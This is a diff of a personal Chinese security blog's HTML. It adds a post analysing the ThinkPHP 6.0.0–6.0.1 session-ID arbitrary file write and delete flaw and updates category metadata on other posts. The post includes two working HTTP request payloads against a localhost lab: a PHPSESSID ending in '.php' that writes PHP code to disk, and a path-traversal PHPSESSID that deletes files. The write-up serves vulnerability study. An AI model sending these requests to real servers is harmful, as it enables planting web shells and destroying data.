@@ -192,6 +192,142 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zls1793.github.io/2024/01/24/thinkphp-v6.0.0-6.0.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="LtmThink">
+      <meta itemprop="description" content="LtmThink的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LtmThink">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/01/24/thinkphp-v6.0.0-6.0.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">thinkphp-v6.0.0-6.0.1任意文件操作漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-01-24 00:00:00 / 修改时间：20:46:28" itemprop="dateCreated datePublished" datetime="2024-01-24T00:00:00+08:00">2024-01-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/thinkphp%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">thinkphp框架漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="漏洞介绍">漏洞介绍:</h2>
+<p>2020年1月10日,ThinkPHP团队发布一个补丁更新,修复了一处由不安全的SessionId导致的任意文件操作漏洞.</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>在目标环境为Windows且开启session的情况下，容易遭受任意文件删除攻击。</p>
+</li>
+<li class="lvl-2">
+<p>在目标环境开启session且写入的session可控的情况下，容易遭受任意文件写入攻击。</p>
+</li>
+</ul>
+<h2 id="漏洞环境">漏洞环境:</h2>
+<p>版本:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP V6.0.0-v6.0.1</span><br><span class="line">php v7.3.4</span><br></pre></td></tr></table></figure>
+<p>回退thinkphp版本的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">修改composer.json文件的下面内容,指定&quot;topthink/framework&quot;: &quot;6.0.1&quot;,</span><br><span class="line">  &quot;require&quot;: &#123;</span><br><span class="line">        &quot;php&quot;: &quot;&gt;=7.1.0&quot;,</span><br><span class="line">        &quot;topthink/framework&quot;: &quot;6.0.1&quot;,</span><br><span class="line">        &quot;topthink/think-orm&quot;: &quot;2.0.30&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">然后打开命令行输入下面指令进行回退</span><br><span class="line">composer update</span><br></pre></td></tr></table></figure>
+<p>环境搭建</p>
+<ol>
+<li class="lvl-3">
+<p>进入\tp6.0\app\middleware.php开启session</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042350.png" alt="image-20240120235630354"></p>
+</li>
+<li class="lvl-3">
+<p>在Index.php文件中添加可以控制session内容的方法</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042351.png" alt="image-20240120235657131"></p>
+</li>
+</ol>
+<h2 id="漏洞分析">漏洞分析:</h2>
+<h4 id="1-sessionId的控制">1.sessionId的控制</h4>
+<p>thinkphp开启session初始化后,每次处理网页请求会调用SessionInit::handle对session进行初始化。</p>
+<p>开启session后在默认的配置下是会将cookie中PHPSESSID的值作为$sessionid的值</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042352.png" alt="image-20240121001503183"></p>
+<p>再进入第60行的SessionInit::setId方法。可以发现只要我们的<code>$sessionid</code>长度为32个字节,即可控制<code>$this-&gt;id</code>为<code>$sessionid</code>。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042353.png" alt="image-20240121001832529"></p>
+<h4 id="2-session值的控制">2.session值的控制</h4>
+<p>再来分析通过助手函数session()保存传入的session值的逻辑</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042354.png" alt="image-20240121002514844"></p>
+<p>进入session(),顺着处理逻辑继续进入Session::set,发现Arr::set</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042355.png" alt="image-20240121002805111"></p>
+<p>然后再继续进入Arr::set,可以发现在这里Arr::set的作用就是给<code>$this-&gt;data</code>数组添加键值对对<code>'session_name'=&gt;$_POST['value']</code>。</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042356.png" alt="image-20240121002745094"></p>
+<p>现在我们已经知道session的内容保存在<code>$this-&gt;data</code>中</p>
+<h4 id="3-session文件操作">3.session文件操作</h4>
+<p>session文件的生成的处理函数在SessionInit::end中</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042357.png" alt="image-20240121003407620"></p>
+<p>进入save方法,这里write对应于session文件的生成,delete对应于session文件的生成</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042358.png" alt="image-20240121003559923"></p>
+<h5 id="任意文件上传漏洞">任意文件上传漏洞</h5>
+<p>先来分析write方法,该方法位于tp6.0\vendor\topthink\framework\src\think\session\driver\File.php的File类中</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042359.png" alt="image-20240121004120765"></p>
+<p>所以通过控制PHPSEEIONID和写入session的内容我们可以实现上传可控文件名和内容的文件到\tp6.0\runtime\session\目录下</p>
+<p>payload数据包类似以下形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /tp6.0/public/index.php/index/test HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 24</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/tp6.0/public/index.php/index/test</span><br><span class="line">Cookie: PHPSESSID=1234567890123456789012345678.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">value=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>在runtime/session/目录生成可控文件名文件内容的php文件</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042360.png" alt="image-20240121005558191"></p>
+<h5 id="任意文件删除漏洞">任意文件删除漏洞</h5>
+<p>再来分析delete方法,该方法也位于File类中</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042361.png" alt="image-20240121004750650"></p>
+<p>在windows平台下可以绕过sess_实现文件删除,linux下就不可以了</p>
+<p>payload数据包类似以下形式,注意PHPSESSIONID为32个字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//这个数据宝将会删除/runtime/session/目录下的a.php文件(如果该目录下有这个文件的话)</span><br><span class="line">GET /tp6.0/public/index.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=12345678901234567890123/../a.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞总结">漏洞总结:</h2>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>在目标环境为Windows且开启session的情况下，容易遭受任意文件删除攻击。</p>
+</li>
+<li class="lvl-2">
+<p>在目标环境开启session且写入的session可控的情况下，容易遭受任意文件写入攻击。</p>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://zls1793.github.io/2024/01/21/thinkphp-v6.0.0-6.0.3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -215,21 +351,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-01-21 00:00:00 / 修改时间：19:50:22" itemprop="dateCreated datePublished" datetime="2024-01-21T00:00:00+08:00">2024-01-21</time>
+              <time title="创建时间：2024-01-21 00:00:00" itemprop="dateCreated datePublished" datetime="2024-01-21T00:00:00+08:00">2024-01-21</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-01-24 20:46:19" itemprop="dateModified" datetime="2024-01-24T20:46:19+08:00">2024-01-24</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">cms漏洞复现</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/thinkphp/" itemprop="url" rel="index"><span itemprop="name">thinkphp</span></a>
+                  <a href="/categories/thinkphp%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">thinkphp框架漏洞</span></a>
                 </span>
             </span>
 
@@ -343,21 +481,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-01-19 00:00:00 / 修改时间：14:37:15" itemprop="dateCreated datePublished" datetime="2024-01-19T00:00:00+08:00">2024-01-19</time>
+              <time title="创建时间：2024-01-19 00:00:00" itemprop="dateCreated datePublished" datetime="2024-01-19T00:00:00+08:00">2024-01-19</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-01-24 20:46:48" itemprop="dateModified" datetime="2024-01-24T20:46:48+08:00">2024-01-24</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">cms漏洞复现</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/thinkphp/" itemprop="url" rel="index"><span itemprop="name">thinkphp</span></a>
+                  <a href="/categories/thinkphp%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">thinkphp框架漏洞</span></a>
                 </span>
             </span>
 
@@ -490,21 +630,23 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-01-17 00:00:00 / 修改时间：12:53:50" itemprop="dateCreated datePublished" datetime="2024-01-17T00:00:00+08:00">2024-01-17</time>
+              <time title="创建时间：2024-01-17 00:00:00" itemprop="dateCreated datePublished" datetime="2024-01-17T00:00:00+08:00">2024-01-17</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-01-24 20:46:37" itemprop="dateModified" datetime="2024-01-24T20:46:37+08:00">2024-01-24</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">cms漏洞复现</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/thinkphp/" itemprop="url" rel="index"><span itemprop="name">thinkphp</span></a>
+                  <a href="/categories/thinkphp%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">thinkphp框架漏洞</span></a>
                 </span>
             </span>
 
@@ -824,14 +966,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
